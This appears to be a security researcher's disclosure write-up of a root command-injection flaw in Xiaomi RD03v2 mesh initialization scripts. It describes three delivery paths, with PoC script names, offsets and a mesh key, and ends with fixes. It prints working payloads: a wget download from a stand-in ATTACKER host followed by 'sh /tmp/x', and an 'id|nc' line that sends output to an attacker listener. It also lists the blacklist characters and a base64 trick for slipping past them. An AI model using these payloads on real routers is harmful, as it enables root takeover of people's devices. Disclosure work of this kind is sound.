# V2 — unauthenticated root command execution

V2 is the root command-injection vulnerability in Xiaomi's mesh initialization
scripts. It is not one fixed exploit sequence and it does not inherently depend on
V1 ([the separate admin-takeover finding](v1-admin-takeover.md)). Three delivery
paths reach the same root `eval`, with different device states,
payload limits, and evidence levels.

**CVSS 3.1: 8.8 High — `AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`** for both
hardware-confirmed adjacent paths. The V1-assisted CAP path requires a deliberately
prepared gate-open state; the direct RE/WAN path requires a factory-reset router and
WAN-side L2 position.

## Choose the path by target state

| V2 delivery path | Required target state and preparation | Needs V1? | Attacker position | Payload | Validation |
|---|---|---:|---|---|---|
| **V1-assisted OTA CAP delivery** (`ota_rce.py`) | Factory reset, then `init_router.py --reboot` to set `INITTED=YES`, leave `NETMODE` unset, and start the CAP listener | **Yes**, unless the attacker already has admin | Main LAN / Wi-Fi | No small field-specific cap found for UCI `encryption` | Hardware: root callback and interactive shell |
| **Direct CAP/LAN delivery** (`rce_poc.py`) | Reachable initialized CAP in the tested gate-open state (`get_netmode=0`, UCI `NETMODE` unset) | No | Main LAN / Wi-Fi | About four command characters | Emulation: daemon-driven root file |
| **Direct factory RE/WAN delivery** (`re_wan_rce.py`) | Factory state (`INITTED!=YES`), selected WAN has DHCP/gateway state, rogue CAP wins discovery | No | WAN-side L2 | 32/64 reliable bytes; 36/66 encoder limits | Hardware: direct `uid=0(root)` callback |

The rows are independent delivery choices. In `ota_rce.py`, V1 and V2 use separate
`cab_meshd` connections: V1 stops after reading the CAP's type-6 sync and mints an
admin `stok`; after the API plant, V2 opens a new connection and completes the
`4 → 5 → 7` trigger. V1 supplies access for the full-size UCI payload plant. It is
not a prerequisite of the V2 sink or of either direct delivery path.

## Shared sink and path-specific inputs

All three V2 delivery paths converge on `mimesh_init.sh:717`, but they place
attacker input there in three different ways:

- The V1-assisted OTA CAP path stores raw shell text in the Wi-Fi `encryption`
  UCI values. `encryption` passes through the web API's `hackCheck`; the working
  payload avoids its blocked characters and uses permitted `\"`, spaces, and `#`.
  `do_cap_init` reads the stored value directly, so it never passes through the
  daemon's separate `check_injection` blacklist.
- The direct CAP/LAN path puts an attacker-computed base64 token, preceded by a
  five-word positional pad, in the type-4 plant. `check_injection` (`0x9308`,
  blacklist at `0xe2c9`: `` @`$#,;'\"[]&*()|<> ``) sees only the permitted pad
  and base64 text; space is not in that blacklist. Unquoted `$@` moves the token
  to `do_cap_init` `$6`, where `base64 -d` restores the shell expression before
  the root `eval`.
- In the RE/WAN path, the daemon itself base64-encodes raw type-6 backhaul fields
  before `check_injection`; `do_re_init` later decodes them and restores the
  screened metacharacters before the same root `eval`.

The shared shell tail is:

```text
mesh_connect.sh:6       source /lib/mimesh/mimesh_init.sh
do_cap_init/do_re_init  collect UCI or decoded wire values
                        build JSON for mimesh_init
mimesh_init.sh:717      eval "$key=\"`json_get_value ...`\""
```

For direct CAP/LAN, `mesh_connect.sh:22` invokes unquoted `$@`, which splits the
single planted string into the five-word pad and the base64 token. On RE/WAN, the
C template already emits separate positions; unquoted `$@` matters because empty
earlier values are dropped and can shift the controlled backhaul fields away from
`do_re_init` `$7/$8`.

The C entry points differ:

- Both CAP deliveries receive type-7 and call the `cap_init` builder at `0xa3bc`,
  then `system()` at `0xa598`.
- RE/WAN receives type-6 and calls the `re_init` builder at `0xa950`, then
  `system()` at `0xae94`.

The CAP PoCs use the tested `4 → 5 → 7` exchange. The stock type-7 handler itself
does not compare the connection state or validate an HMAC before calling the
builder; in CAP/server mode it checks `body[0] == 1`. Type-4 remains necessary for
the direct CAP/LAN PoC because that message carries its plant. `ota_rce.py` keeps
the full tested exchange even though its payload was planted in UCI beforehand.

The later `do_cap_init` shell gate blocks the sink for `NETMODE=whc_cap`, and for
`NETMODE=lanapmode` together with `CAP_MODE=ap`. `do_re_init` has no equivalent
`NETMODE` guard.

## Path A — V1-assisted OTA CAP delivery

This is the full-payload, over-Wi-Fi path implemented by `poc/ota_rce.py` and
confirmed on physical RD03v2 hardware.

### Demonstrated setup requirements

The hardware result used this exact preparation:

1. Factory-reset an RD03v2 running stock 2.0.28.
2. Run `poc/init_router.py --host 192.168.31.1 --reboot`.
3. Confirm the helper set `INITTED=YES`, left `NETMODE` unset, and rebooted the
   router so `/etc/init.d/cab_meshd` started `cab_meshd -S -i br-lan`.
4. Join the router's main Wi-Fi or LAN and confirm TCP/19553 is reachable.

`init_router.py` is **laboratory preparation**, not an exploit primitive and not an
attacker capability demonstrated against a normally configured router. A factory
unit has no inbound CAP listener, so this path cannot begin until the preparation
and reboot are complete. Xiaomi's normal web wizard can instead call
`mesh_connect.sh init_cap 2` and commit `NETMODE=whc_cap`; that state skips the
demonstrated CAP root sink. No non-reset transition from that normal configured
state to the gate-open state has been demonstrated.

### Why this path uses V1

The current OTA delivery needs an admin API call to store a long payload in the
Wi-Fi `encryption` UCI values. V1 supplies that access:

1. V1 forges the mesh HMAC, reaches `ST_RUNNING`, receives `web_passwd256`, and
   mints an admin `stok`.
2. `set_wifi_without_restart` stores payloads in the 2.4 GHz and 5 GHz
   `encryption` fields while preserving the SSID.
3. A credential-free `4 → 5 → 7` mesh exchange triggers `cap_init`.
4. `do_cap_init` reads the poisoned UCI values and passes them into
   `mimesh_init.sh`'s root `eval`.

If a tester already has a valid admin session, step 1 can be skipped; the payload
plant and V2 trigger remain the same. V1 is therefore a delivery dependency of
`ota_rce.py`, not a dependency of V2 itself.

### Payload construction

The two values pass the web layer's `hackCheck` because they contain none of its
blocked bytes (backtick, ``;|$&`` or newline):

```text
2.4 GHz: \" wget http://ATTACKER:8000/s -O /tmp/x #
5 GHz:   \" sh /tmp/x #
```

When `mimesh_init.sh` evaluates a parsed value, `\"` becomes `"`; the first value
becomes an assignment-prefixed `wget`, and `#` comments out the trailing syntax.
The second value executes the downloaded stager. No small field-specific limit was
found for this UCI plant; ordinary HTTP, nginx, UCI, shell, and process limits still
apply.

### Hardware proof

The stager returned:

```text
*** ROOT CALLBACK: /pwned?uid=0_user=root_host=XiaoQiang ***
```

The reconnecting shell then reported:

```text
uid=0(root) gid=0(root)
Linux XiaoQiang 4.4.60 #0 SMP PREEMPT ... armv7l GNU/Linux
RD03v2
```

The payload restored valid Wi-Fi encryption and reconnected the test station.
Detailed output is in `evidence/hardware-validation.md`.

## Path B — direct CAP/LAN delivery

This path reaches the CAP sink without V1 or an admin API plant, but its payload is
very small.

### Prerequisites

- `cab_meshd -S -i br-lan` is reachable on an initialized CAP.
- The supported reproduction state is API `get_netmode=0` with UCI `NETMODE`
  unset. The shell skips the sink for `whc_cap`, and also for
  `NETMODE=lanapmode` together with `CAP_MODE=ap`.
- The attacker is on the main LAN or Wi-Fi.

The state produced by `init_router.py` satisfies these conditions in the lab, but
the direct payload was not executed on physical hardware. Its evidence level is
daemon-driven emulation.

### Delivery

The type-4 handler copies 19 bytes from `body[0x90]` into `conn+0x10e`. A five-word
pad makes the following base64 token become `do_cap_init` `$6` after unquoted `$@`
re-splitting:

```text
type-4 body[0x90] = "a a a a a " + base64(`CMD`)
```

The plant has only eight base64 bytes left after the pad: about six decoded bytes,
including the surrounding backticks, or roughly four command characters.

### Emulation proof

With `NETMODE` unset, the stock daemon and scripts processed ``base64("`>W`")`` and
created root-owned `/W`. An `` `id` `` payload reached the same root sink. A
completed `cap_init` can then set `NETMODE=whc_cap`, making this path effectively
one-shot.

PoC: `poc/rce_poc.py`.

## Path C — direct factory RE/WAN delivery

This is the simplest confirmed root path for a factory-reset device. It requires
neither V1 nor `init_router.py`; the router initiates the connection.

### Prerequisites

- Stock RD03v2 2.0.28 remains uninitialized (`INITTED!=YES`; API
  `init_info.inited=0`).
- The attacker shares the selected WAN port's L2 segment and can provide ordinary
  DHCP/gateway state.
- The rogue CAP answers discovery before any legitimate CAP.

The hardware test used attacker `192.168.77.1/24` and router lease
`192.168.77.142` on an isolated WAN segment.

### Startup and reversed handshake

The shipped static config has an empty WAN name, but boot-time `port_service`
assigned `network.wan.ifname=eth1.4` before `START=99`. The router started:

```text
/usr/sbin/cab_meshd -C -i eth1.4
```

The live exchange was:

1. RE broadcasts `MIROUTE_RE_DDv1.0\0` to `255.255.255.255:19553`.
2. Rogue CAP replies with `MIROUTE_CAP_DDv1.0` and its IP at offset `0x12`.
3. RE opens TLS to the advertised address. The rogue CAP uses a self-signed
   certificate; the RE performs no certificate verification.
4. RE sends type-4 authentication using the `q38d…` key.
5. Rogue CAP sends type-5 success and type-4 authentication generated with
   `x38d364d8ed3bd085e150211ea6b3715`.
6. RE accepts the predicted `x` token, replies type-5 success, and enters
   `ST_RUNNING`.
7. Rogue CAP sends the type-6 `re_init` body.

Hardware negotiated `TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384`.

### Type-6 layout and argument alignment

The accepted body is 1,764 bytes and follows the stock CAP sync layout. Builder
`0xa950` base64-encodes raw fields at:

- `body+0xe6` → seventh string position → `do_re_init` `$7` (`bh_ssid`)
- `body+0x107` → eighth string position → `do_re_init` `$8` (`bh_pswd`)

The stock CAP body leaves four earlier front-haul password/management fields empty.
Because `run_with_lock` invokes unquoted `$@`, ash drops those empty words and
shifts the controlled fields away from `$7/$8`. The working type-6 message fills
all four with benign nonempty values, preserving all nine string positions.

The encoder destinations allow 36 bytes for `bh_ssid` and 66 bytes for `bh_pswd`.
Their adjacent NUL-terminated wire slots provide straightforward non-overlapping
capacities of 32 and 64 bytes. Carefully designed overlap can recover some of the
remaining encoder headroom.

### Hardware proof

The 23-byte expression in `bh_pswd` was:

```text
`id|nc 192.168.77.1 80`
```

The isolated listener received:

```text
[ROOT PROOF] callback from 192.168.77.142: uid=0(root) gid=0(root)
[+] CONFIRMED: RE/WAN payload executed as uid 0 (root)
```

PoC: `poc/re_wan_rce.py`.

### One-shot state transition

`do_re_init` has no `NETMODE` guard, and the defined `check_re_initted` helper is
unused. A successful run nevertheless continues through normal mesh initialization:
it sets `INITTED=YES`, changes the wired DHCP client from the WAN MAC to the LAN
MAC, and stops `cab_meshd`. The exposure is therefore one-shot after a successful
run and returns only after another factory reset. Failed or interrupted attempts can
reconnect while the router remains uninitialized.

## Validation status

- **V1-assisted OTA CAP delivery:** physical hardware, root callback and
  interactive shell, after explicit `init_router.py` laboratory preparation.
- **Direct CAP/LAN delivery:** stock daemon and scripts in emulation; direct
  payload not executed on hardware.
- **Direct factory RE/WAN delivery:** physical hardware from `inited=0` through
  DHCP, discovery, reversed HMAC/TLS, type-6 delivery, and `uid=0(root)` callback.

These evidence levels must not be merged. In particular, the OTA result does not
show reachability after Xiaomi's normal wizard sets `whc_cap`, and the RE/WAN result
applies to the separate factory/WAN state.

## Fix

1. Replace the firmware-global mesh key with per-device or enrollment credentials.
2. Require mutual TLS and verify the peer certificate.
3. Quote `"$@"` in `run_with_lock`.
4. Remove `eval` from parsed mesh data; assign validated values without reparsing
   them as shell code.
5. Treat decoded peer fields as opaque data instead of relying on a blacklist that
   sees only an allowed pad/base64 form on CAP or daemon-generated base64 on RE.

See `remediation.md` for the complete vendor recommendations.
